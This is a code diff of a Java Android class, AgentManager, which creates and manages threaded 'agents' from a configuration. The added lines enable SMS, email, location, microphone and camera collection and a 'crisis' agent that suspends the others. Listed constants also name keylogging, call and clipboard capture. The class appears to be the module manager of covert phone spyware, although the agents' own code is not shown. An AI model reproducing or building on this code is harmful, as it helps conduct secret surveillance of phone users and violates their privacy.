@@ -9,229 +9,306 @@ package com.ht.RCSAndroidGUI.agent;
 
 import java.util.HashMap;
 import java.util.Iterator;
-import java.util.Map;
-
-import com.ht.RCSAndroidGUI.Status;
 
 import android.util.Log;
 
-public class AgentManager {
+import com.ht.RCSAndroidGUI.Manager;
+import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.utils.Check;
+
+// TODO: Auto-generated Javadoc
+/**
+ * The Class AgentManager.
+ */
+public class AgentManager extends Manager<AgentBase> {
+
+	/** The Constant TAG. */
 	private static final String TAG = "AgentManager";
-	
+
+	/** The singleton. */
 	private volatile static AgentManager singleton;
-	private Status statusObj;
-	
-	private HashMap<Integer, AgentBase> running;
-	
+
+	/**
+	 * Self.
+	 * 
+	 * @return the agent manager
+	 */
 	public static AgentManager self() {
 		if (singleton == null) {
-			synchronized(AgentManager.class) {
+			synchronized (AgentManager.class) {
 				if (singleton == null) {
-                    singleton = new AgentManager();
-                }
+					singleton = new AgentManager();
+				}
 			}
 		}
 
 		return singleton;
 	}
-	
-	private AgentManager() {
-		statusObj = Status.self();
-		
-		running = new HashMap<Integer, AgentBase>();
-	}
-	
+
 	/**
-	 * mapAgent()
-	 * Add agent id defined by "key" into the running map. If the agent
-	 * is already present, the old object is returned.
+	 * mapAgent() Add agent id defined by "key" into the running map. If the
+	 * agent is already present, the old object is returned.
 	 * 
-	 * @param key: Agent ID
+	 * @param key
+	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private AgentBase mapAgent(int key) {
+	private AgentBase factory(final int key) {
 		AgentBase a = null;
-		
+
 		if (running.containsKey(key) == true) {
-			return running.get(key);			
+			return running.get(key);
 		}
-		
+
 		switch (key) {
-			case Agent.AGENT_SMS:
-				break;
-				
-			case Agent.AGENT_TASK:
-				break;
-				
-			case Agent.AGENT_CALLLIST:
-				break;
-				
-			case Agent.AGENT_DEVICE:
-				a = new DeviceAgent();
-				break;
-				
-			case Agent.AGENT_POSITION:
-				break;
-				
-			case Agent.AGENT_CALL:
-				break;
-				
-			case Agent.AGENT_CALL_LOCAL:
-				break;
-				
-			case Agent.AGENT_KEYLOG:
-				break;
-				
-			case Agent.AGENT_SNAPSHOT:
-				a = new SnapshotAgent();
-				break;
-				
-			case Agent.AGENT_URL:
-				break;
-				
-			case Agent.AGENT_IM:
-				break;
-				
-			case Agent.AGENT_EMAIL:
-				break;
-				
-			case Agent.AGENT_MIC:
-				break;
-				
-			case Agent.AGENT_CAM:
-				break;
-				
-			case Agent.AGENT_CLIPBOARD:
-				break;
-				
-			case Agent.AGENT_CRISIS:
-				break;
-				
-			case Agent.AGENT_APPLICATION:
-				break;
-				
-			default:
-				break;
+		case AgentConf.AGENT_SMS:
+			a = new MessageAgent();
+			break;
+
+		case AgentConf.AGENT_TASK:
+			break;
+
+		case AgentConf.AGENT_CALLLIST:
+			break;
+
+		case AgentConf.AGENT_DEVICE:
+			a = new DeviceAgent();
+			break;
+
+		case AgentConf.AGENT_POSITION:
+			a = new PositionAgent();
+			break;
+
+		case AgentConf.AGENT_CALL:
+			break;
+
+		case AgentConf.AGENT_CALL_LOCAL:
+			break;
+
+		case AgentConf.AGENT_KEYLOG:
+			break;
+
+		case AgentConf.AGENT_SNAPSHOT:
+			a = new SnapshotAgent();
+			break;
+
+		case AgentConf.AGENT_URL:
+			break;
+
+		case AgentConf.AGENT_IM:
+			break;
+
+		case AgentConf.AGENT_EMAIL:
+			a = new MessageAgent();
+			break;
+
+		case AgentConf.AGENT_MIC:
+			a = new MicAgent();
+			break;
+
+		case AgentConf.AGENT_CAM:
+			a = new CameraAgent();
+			break;
+
+		case AgentConf.AGENT_CLIPBOARD:
+			break;
+
+		case AgentConf.AGENT_CRISIS:
+			a = new CrisisAgent();
+			break;
+
+		case AgentConf.AGENT_APPLICATION:
+			break;
+
+		default:
+			break;
 		}
-		
+
 		if (a != null) {
 			running.put(key, a);
 		}
-		
+
 		return a;
 	}
-	
-	public boolean startAgents() {
-		HashMap<Integer, Agent> agents;
-		
-		agents = statusObj.getAgentsMap();
-		
+
+	/**
+	 * Start agents.
+	 * 
+	 * @return true, if successful
+	 */
+	public boolean startAll() {
+		HashMap<Integer, AgentConf> agents;
+		agents = status.getAgentsMap();
+
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return false;
 		}
-		
+
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return false;
 		}
-		
-		Iterator<Map.Entry<Integer, Agent>> it = agents.entrySet().iterator();
+
+		final Iterator<Integer> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
-			Map.Entry<Integer, Agent> pairs = it.next();
-
-			if (pairs.getValue().getStatus() != Agent.AGENT_ENABLED)
-				continue;
-			
-			AgentBase a = mapAgent(pairs.getKey());
-			
-			if (a != null) {
-				a.parse(pairs.getValue().getParams());
-				a.start();
-			}
+			final Integer key = it.next();
+			start(key);
 		}
-		
+
 		return true;
 	}
-	
-	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
-	public void stopAgents() {
-		Iterator<Map.Entry<Integer, AgentBase>> it = running.entrySet().iterator();
-		
-		while (it.hasNext()) {
-			Map.Entry<Integer, AgentBase> pairs = it.next();
 
-			if (pairs.getValue().getStatus() != Agent.AGENT_RUNNING)
-				continue;
-			
-			pairs.getValue().stopThread();
-		}	
+	// Deve essere bloccante. Attende l'effettivo stop di tutto.
+	/**
+	 * Stop agents.
+	 */
+	public void stopAll() {
+		HashMap<Integer, AgentConf> agents;
+		agents = status.getAgentsMap();
+		final Iterator<Integer> it = agents.keySet().iterator();
+
+		while (it.hasNext()) {
+			final Integer key = it.next();
+			stop(key);
+		}
+		
+		running.clear();
+		threads.clear();
 	}
-	
-	public synchronized void startAgent(int key) {
-		HashMap<Integer, Agent> agents;
-		
-		agents = statusObj.getAgentsMap();
-		
+
+	/**
+	 * Start agent.
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public synchronized void start(final int key) {
+		HashMap<Integer, AgentConf> agents;
+
+		agents = status.getAgentsMap();
+
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return;
 		}
-		
+
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return;
 		}
-		
-		AgentBase a = mapAgent(key);
-		
-		if (a == null)
+
+		AgentBase a = factory(key);
+
+		if (a == null) {
 			return;
-		
+		}
+
 		// Agent mapped and running
-		if (a.getStatus() == Agent.AGENT_RUNNING) {
-			Log.d("RCS", "Agent " + key + " is already running");
+		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
+			Log.d(TAG, "Agent " + key + " is already running");
 			return;
 		}
-		
+
 		// start() will NEVER be valid again on a stopped thread
 		// so unmap and restart the thread
-		if (a.getStatus() == Agent.AGENT_STOPPED) {
-			running.remove(key);
-			a = mapAgent(key);
+		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
+			// running.remove(key);
+			a = factory(key);
 		}
-		
-		if (a != null) {
-			a.parse(agents.get(key).getParams());
-			a.start();
-		}
+
+		Check.asserts(a != null, "null agent");
+		Check.asserts(running.get(key) != null, "null running");
+
+		a.parse(agents.get(key).getParams());
+
+		final Thread t = new Thread(a);
+		threads.put(a, t);
+		t.start();
+
 	}
-	
-	public synchronized void stopAgent(int key) {
-		AgentBase a = running.get(key);
-		
+
+	/**
+	 * Stop agent.
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public synchronized void stop(final int key) {
+		final AgentBase a = running.get(key);
 		if (a == null) {
-			Log.d("RCS", "Agent " + key + " not present");
+			Log.d(TAG, "Agent " + key + " not present");
 			return;
 		}
-		
+
 		a.stopThread();
-	}
+		running.remove(key);
 
-	public synchronized void restartAgent(int key) {
-		AgentBase a = running.get(key);
-		stopAgent(key);
-		try {
-			a.join();
-		} catch (InterruptedException e) {
-			Log.e(TAG,e.toString());
+		final Thread t = threads.get(a);
+		if (t != null) {
+			try {
+				t.join();
+			} catch (final InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
 		}
-		startAgent(key);
+		threads.remove(a);
 	}
 
-	public void reloadAgent(int key) {
-		// TODO Auto-generated method stub
-		
+	/**
+	 * Suspend an agent, used by crisis
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void suspend(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d(TAG, "Agent " + key + " not present");
+			return;
+		}
+
+		// suspending a thread implies a stop
+		a.suspend();
+
+		final Thread t = threads.get(a);
+		if (t != null) {
+			try {
+				t.join();
+			} catch (final InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		threads.remove(a);
+
 	}
+
+	/**
+	 * Resume an agent, only if suspended
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void resume(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d(TAG, "Agent " + key + " not present");
+			return;
+		}
+
+		if (a.isSuspended()) {
+			// this clean the suspendend status
+			a.resume();
+
+			// start a new thread and restart the loop.
+			final Thread t = new Thread(a);
+			threads.put(a, t);
+			t.start();
+
+		}
+	}
+
 }
